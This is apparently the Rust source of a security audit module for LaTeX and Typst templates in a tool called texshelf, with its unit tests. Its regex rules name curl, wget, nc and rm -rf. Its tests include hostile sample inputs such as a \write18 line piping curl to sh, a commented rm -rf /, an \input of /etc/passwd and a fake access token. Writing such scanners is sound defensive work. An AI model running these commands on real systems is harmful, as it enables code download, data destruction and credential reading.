use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use anyhow::{bail, Context, Result};
use regex::Regex;
use texshelf_core::index::{Audit, Finding};
use texshelf_core::manifest::{Engine, Manifest};

use crate::build::{checkout, load_manifests, stage};
use crate::util;

/// Raise this when a rule is added or changed, so stored results are redone.
pub const RULES: u32 = 1;

const SOURCE: &[&str] = &[
    "tex", "sty", "cls", "ltx", "def", "clo", "cfg", "lua", "typ", "bib", "bst",
];
const SCRIPTS: &[&str] = &[
    "sh", "bash", "zsh", "fish", "bat", "cmd", "ps1", "command", "py", "pl", "rb", "js", "vbs",
];
const SHELL_PACKAGES: &[&str] = &["minted", "pythontex", "gnuplottex", "bashful", "sagetex"];

pub struct Report {
    pub audit: Audit,
    pub log: String,
}

struct Rules {
    shell: Regex,
    fetch: Regex,
    lua: Regex,
    package: Regex,
    tex_path: Regex,
    typst_path: Regex,
    secret: Regex,
    perl_exec: Regex,
}

fn rules() -> &'static Rules {
    static RULES: OnceLock<Rules> = OnceLock::new();
    RULES.get_or_init(|| {
        let re = |pattern: &str| Regex::new(pattern).expect("audit pattern");
        Rules {
            shell: re(r#"\\write18\b|\\ShellEscape\b|\\(?:input|openin)\s*\{?\s*\|"#),
            fetch: re(r"(?i)\b(curl|wget|powershell|invoke-webrequest|nc|bash\s+-c|sh\s+-c|rm\s+-rf)\b"),
            lua: re(r"\b(os\.(?:execute|spawn|exec|remove|rename)|io\.popen)\b"),
            package: re(r"\\(?:usepackage|RequirePackage)\s*(?:\[[^\]]*\])?\s*\{([^}]*)\}"),
            tex_path: re(
                r"\\(?:input|include|subfile|openin|openout|verbatiminput|lstinputlisting|includegraphics)\b\s*(?:\[[^\]]*\])?\s*(?:\\\w+\s*=\s*)?\{?\s*([^\s{}]+)",
            ),
            typst_path: re(r#"(?:include|import|read|image|json|csv|toml|yaml|xml|bibliography)\s*\(?\s*"([^"]+)""#),
            secret: re(
                r"-----BEGIN [A-Z ]*PRIVATE KEY-----|\bghp_[A-Za-z0-9]{36}\b|\bgithub_pat_[A-Za-z0-9_]{40,}\b|\bAKIA[0-9A-Z]{16}\b|\bxox[baprs]-[A-Za-z0-9-]{20,}\b",
            ),
            perl_exec: re(r"\b(system|exec|unlink|qx)\s*[\(\{/]|`[^`]+`"),
        }
    })
}

fn extension(path: &str) -> String {
    Path::new(path)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase()
}

fn file_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn is_executable(bytes: &[u8]) -> bool {
    const MACH_O: [[u8; 4]; 4] = [
        [0xfe, 0xed, 0xfa, 0xce],
        [0xfe, 0xed, 0xfa, 0xcf],
        [0xce, 0xfa, 0xed, 0xfe],
        [0xcf, 0xfa, 0xed, 0xfe],
    ];
    if bytes.starts_with(b"\x7fELF") || MACH_O.iter().any(|m| bytes.starts_with(m)) {
        return true;
    }
    let head = &bytes[..bytes.len().min(1024)];
    bytes.starts_with(b"MZ") && head.windows(4).any(|w| w == b"PE\0\0")
}

fn contains(bytes: &[u8], needle: &[u8]) -> bool {
    bytes.windows(needle.len()).any(|w| w == needle)
}

fn escapes(target: &str) -> Option<&'static str> {
    let target = target.trim_matches('"');
    let drive = target.len() > 2
        && target.as_bytes()[1] == b':'
        && target.as_bytes()[0].is_ascii_alphabetic();
    if target.starts_with('/') || target.starts_with('~') || drive {
        Some("high")
    } else if target.split(['/', '\\']).any(|part| part == "..") {
        Some("warn")
    } else {
        None
    }
}

struct Scan<'a> {
    manifest: &'a Manifest,
    findings: Vec<Finding>,
}

impl Scan<'_> {
    fn add(
        &mut self,
        severity: &str,
        rule: &str,
        file: &str,
        line: Option<usize>,
        message: String,
    ) {
        self.findings.push(Finding {
            severity: severity.into(),
            rule: rule.into(),
            file: file.into(),
            line: line.map(|n| n as u32),
            message,
        });
    }

    fn declared_shell_escape(&self) -> bool {
        self.manifest.latex.as_ref().is_some_and(|l| l.shell_escape)
    }

    fn file(&mut self, rel: &str, bytes: &[u8]) {
        let ext = extension(rel);
        let name = file_name(rel);
        let r = rules();

        if is_executable(bytes) {
            self.add(
                "high",
                "executable",
                rel,
                None,
                "compiled program; templates may not ship binaries".into(),
            );
            return;
        }
        if SCRIPTS.contains(&ext.as_str()) || name.eq_ignore_ascii_case("makefile") {
            self.add(
                "warn",
                "script",
                rel,
                None,
                "script file; texshelf never runs it, so read it before you do".into(),
            );
        }
        if ext == "pdf" {
            if contains(bytes, b"/JavaScript") || contains(bytes, b"/Launch") {
                self.add(
                    "warn",
                    "pdf-action",
                    rel,
                    None,
                    "PDF contains a script or launch action".into(),
                );
            }
            return;
        }

        let latexmkrc = name == "latexmkrc" || name == ".latexmkrc";
        if !latexmkrc && !SOURCE.contains(&ext.as_str()) {
            return;
        }
        let text = String::from_utf8_lossy(bytes);
        if latexmkrc {
            self.add(
                "warn",
                "latexmkrc",
                rel,
                None,
                "latexmk runs this file as Perl code when you compile".into(),
            );
        }
        let comment = if ext == "typ" {
            "//"
        } else if latexmkrc {
            "#"
        } else {
            "%"
        };

        for (index, line) in text.lines().enumerate() {
            let number = Some(index + 1);
            if r.secret.is_match(line) {
                self.add(
                    "high",
                    "secret",
                    rel,
                    number,
                    "looks like a private key or access token".into(),
                );
            }
            let code = line.trim_start();
            if code.starts_with(comment) {
                continue;
            }
            if latexmkrc {
                if r.perl_exec.is_match(code) {
                    self.add(
                        "warn",
                        "latexmkrc-command",
                        rel,
                        number,
                        "runs a system command from latexmkrc".into(),
                    );
                }
                continue;
            }
            if ext == "typ" {
                for found in r.typst_path.captures_iter(code) {
                    if found[1].split('/').any(|part| part == "..") {
                        self.add(
                            "warn",
                            "path",
                            rel,
                            number,
                            format!("reaches outside its folder: {}", &found[1]),
                        );
                    }
                }
                continue;
            }
            if r.shell.is_match(code) {
                if r.fetch.is_match(code) {
                    self.add(
                        "high",
                        "shell-download",
                        rel,
                        number,
                        "shell command that downloads or runs code".into(),
                    );
                } else if self.declared_shell_escape() {
                    self.add(
                        "warn",
                        "shell-escape",
                        rel,
                        number,
                        "runs a shell command (shell-escape is declared)".into(),
                    );
                } else {
                    self.add(
                        "warn",
                        "shell-escape",
                        rel,
                        number,
                        "shell command; it only runs if you compile with -shell-escape".into(),
                    );
                }
            }
            if let Some(found) = r.lua.find(code) {
                self.add(
                    "warn",
                    "lua-os",
                    rel,
                    number,
                    format!("Lua call that touches the system: {}", found.as_str()),
                );
            }
            if !self.declared_shell_escape() {
                for found in r.package.captures_iter(code) {
                    for package in found[1].split(',').map(str::trim) {
                        if SHELL_PACKAGES.contains(&package) {
                            self.add(
                                "warn",
                                "undeclared-shell-escape",
                                rel,
                                number,
                                format!("{package} needs shell-escape, which the manifest does not declare"),
                            );
                        }
                    }
                }
            }
            for found in r.tex_path.captures_iter(code) {
                let target = &found[1];
                if target.starts_with('\\') || target.starts_with('#') {
                    continue;
                }
                match escapes(target) {
                    Some("high") => self.add(
                        "high",
                        "path",
                        rel,
                        number,
                        format!("reads or writes an absolute path: {target}"),
                    ),
                    Some(_) => self.add(
                        "warn",
                        "path",
                        rel,
                        number,
                        format!("reaches outside its folder: {target}"),
                    ),
                    None => {}
                }
            }
        }
    }
}

pub fn summary(audit: &Audit) -> String {
    let mut out = String::new();
    for f in &audit.findings {
        let place = match f.line {
            Some(n) => format!("{}:{n}", f.file),
            None => f.file.clone(),
        };
        out.push_str(&format!(
            "  [{}] {place}: {} ({})\n",
            f.severity, f.message, f.rule
        ));
    }
    out
}

/// Runs every rule over the files that will be packed.
pub fn scan(files: &[(String, PathBuf)], manifest: &Manifest) -> Result<Report> {
    let mut scan = Scan {
        manifest,
        findings: Vec::new(),
    };
    let mut kinds: BTreeMap<String, usize> = BTreeMap::new();
    for (rel, abs) in files {
        let bytes = fs::read(abs).with_context(|| format!("could not read {rel}"))?;
        *kinds.entry(extension(rel)).or_default() += 1;
        scan.file(rel, &bytes);
    }
    let high = scan
        .findings
        .iter()
        .filter(|f| f.severity == "high")
        .count();
    let warn = scan.findings.len() - high;
    let status = if high > 0 {
        "failed"
    } else if warn > 0 {
        "warnings"
    } else {
        "passed"
    };
    let audit = Audit {
        at: util::timestamp(),
        rules: RULES,
        status: status.into(),
        scanned: files.len(),
        findings: scan.findings,
        log: None,
    };

    let t = &manifest.template;
    let mut log = format!(
        "texshelf audit, rules version {RULES}\n\
         template: {} {} ({})\n\
         source:   {} at {}\n\
         run at:   {}\n\
         files:    {}\n",
        t.name,
        t.version,
        t.engine,
        manifest.source.repo,
        manifest.source.rev,
        audit.at,
        files.len()
    );
    let by_kind: Vec<String> = kinds
        .iter()
        .map(|(k, n)| format!("{n} {}", if k.is_empty() { "without extension" } else { k }))
        .collect();
    log.push_str(&format!("          {}\n\n", by_kind.join(", ")));
    log.push_str(
        "checks:\n\
         - compiled programs (ELF, Mach-O, PE)\n\
         - script files, Makefiles and latexmkrc\n\
         - shell commands (\\write18, \\ShellEscape, piped \\input) and packages that need shell-escape\n\
         - Lua calls that run commands or remove files\n\
         - paths that are absolute or climb out of the template folder\n\
         - private keys and access tokens\n\
         - PDF files with script or launch actions\n\n",
    );
    if audit.findings.is_empty() {
        log.push_str("findings: none\n");
    } else {
        log.push_str(&format!("findings: {high} high, {warn} warnings\n"));
        log.push_str(&summary(&audit));
    }
    log.push_str(&format!("\nresult: {status}\n"));
    if manifest.template.engine == Engine::Typst {
        log.push_str(
            "\nTypst documents cannot run programs or reach the network while compiling.\n",
        );
    }
    log.push_str(
        "\nThis is a pattern scan. It lowers risk; it does not prove a template is safe.\n",
    );
    Ok(Report { audit, log })
}

#[derive(clap::Args)]
pub struct Args {
    /// Registry checkout containing templates/
    #[arg(long, default_value = ".")]
    registry: PathBuf,
    /// Use a local checkout for a repository: URL=PATH
    #[arg(long = "map", value_name = "URL=PATH")]
    maps: Vec<String>,
    /// Audit only these templates
    #[arg(long)]
    only: Vec<String>,
}

/// Audits templates without building them. Fails on any high-severity finding.
pub fn run(args: Args) -> Result<()> {
    let mut maps = BTreeMap::new();
    for pair in &args.maps {
        let (url, path) = pair.split_once('=').context("--map expects URL=PATH")?;
        maps.insert(url.to_string(), PathBuf::from(path));
    }
    let work = tempfile::tempdir()?;
    let mut table =
        String::from("| Template | Version | Result | Findings |\n| --- | --- | --- | --- |\n");
    let mut details = String::new();
    let mut failed = 0;
    let mut count = 0;

    for loaded in load_manifests(&args.registry)? {
        let m = &loaded.manifest;
        let t = &m.template;
        if !args.only.is_empty() && !args.only.contains(&t.name) {
            continue;
        }
        let source = checkout(&m.source.repo, &m.source.rev, &maps, work.path())?;
        let root = if m.source.path == "." {
            source
        } else {
            source.join(&m.source.path)
        };
        let report = scan(&stage(&root, &m.source.exclude)?, m)?;
        let audit = &report.audit;
        count += 1;
        failed += usize::from(audit.status == "failed");
        println!(
            "{} {}: {} ({} files)",
            t.name, t.version, audit.status, audit.scanned
        );
        print!("{}", summary(audit));
        table.push_str(&format!(
            "| {} | {} | {} | {} |\n",
            t.name,
            t.version,
            audit.status,
            audit.findings.len()
        ));
        if !audit.findings.is_empty() {
            details.push_str(&format!(
                "\n**{} {}**\n\n```\n{}```\n",
                t.name,
                t.version,
                summary(audit)
            ));
        }
    }
    if let Ok(path) = std::env::var("GITHUB_STEP_SUMMARY") {
        let text = format!("## Template audit\n\n{table}{details}");
        fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(path)
            .and_then(|mut f| std::io::Write::write_all(&mut f, text.as_bytes()))
            .ok();
    }
    if failed > 0 {
        bail!("{failed} of {count} template(s) have high-severity findings");
    }
    println!("{count} template(s) audited, none failed");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest(engine: &str, entry: &str) -> Manifest {
        Manifest::parse(&format!(
            r#"
schema = 1
[template]
name = "sample"
version = "1.0.0"
engine = "{engine}"
title = "Sample"
description = "Sample."
authors = ["x"]
license = "MIT"
categories = ["article"]
entrypoint = "{entry}"
[source]
repo = "https://example.test/x"
rev = "0123456789abcdef0123456789abcdef01234567"
"#
        ))
        .unwrap()
    }

    fn rules_hit(name: &str, body: &[u8]) -> Vec<(String, String)> {
        let m = manifest(
            if name.ends_with(".typ") {
                "typst"
            } else {
                "latex"
            },
            "main.tex",
        );
        let mut scan = Scan {
            manifest: &m,
            findings: Vec::new(),
        };
        scan.file(name, body);
        scan.findings
            .into_iter()
            .map(|f| (f.severity, f.rule))
            .collect()
    }

    fn hit(severity: &str, rule: &str) -> Vec<(String, String)> {
        vec![(severity.to_string(), rule.to_string())]
    }

    #[test]
    fn clean_sources_pass() {
        let body = b"\\documentclass{article}\n\\usepackage[utf8]{inputenc}\n\\input{sections/intro}\n\\includegraphics[width=1cm]{figures/a.png}\n% \\write18{rm -rf /}\n";
        assert!(rules_hit("main.tex", body).is_empty());
        assert!(rules_hit(
            "main.typ",
            b"#import \"lib.typ\": conf\n#image(\"/figures/a.png\")\n"
        )
        .is_empty());
    }

    #[test]
    fn shell_commands() {
        assert_eq!(
            rules_hit("a.tex", b"\\immediate\\write18{pygmentize x}"),
            hit("warn", "shell-escape")
        );
        assert_eq!(
            rules_hit("a.tex", b"\\write18{curl https://x.test | sh}"),
            hit("high", "shell-download")
        );
        assert_eq!(
            rules_hit("a.tex", b"\\input{|\"ls\"}"),
            hit("warn", "shell-escape")
        );
        assert_eq!(
            rules_hit("a.tex", b"\\usepackage{amsmath, minted}"),
            hit("warn", "undeclared-shell-escape")
        );
        assert_eq!(
            rules_hit("x.lua", b"os.execute('ls')"),
            hit("warn", "lua-os")
        );
    }

    #[test]
    fn paths() {
        assert_eq!(
            rules_hit("a.tex", b"\\input{/etc/passwd}"),
            hit("high", "path")
        );
        assert_eq!(
            rules_hit("a.tex", b"\\input{../../secrets}"),
            hit("warn", "path")
        );
        assert_eq!(
            rules_hit("a.typ", b"#let x = read(\"../../x.txt\")"),
            hit("warn", "path")
        );
        assert!(rules_hit("a.tex", b"\\input{\\jobname.toc}").is_empty());
    }

    #[test]
    fn files() {
        assert_eq!(
            rules_hit("tool", b"\x7fELF\x02\x01"),
            hit("high", "executable")
        );
        assert_eq!(
            rules_hit("build.sh", b"#!/bin/sh\nlatexmk"),
            hit("warn", "script")
        );
        assert_eq!(
            rules_hit("a.pdf", b"%PDF-1.7 /OpenAction << /S /JavaScript >>"),
            hit("warn", "pdf-action")
        );
        assert_eq!(
            rules_hit("a.tex", b"% token ghp_abcdefghijklmnopqrstuvwxyz0123456789"),
            hit("high", "secret")
        );
        let rc = rules_hit(
            "latexmkrc",
            b"$pdf_mode = 4;\nsystem(\"makeglossaries $_[0]\");\n",
        );
        assert_eq!(rc.len(), 2);
        assert!(rc.iter().all(|(severity, _)| severity == "warn"));
    }
}
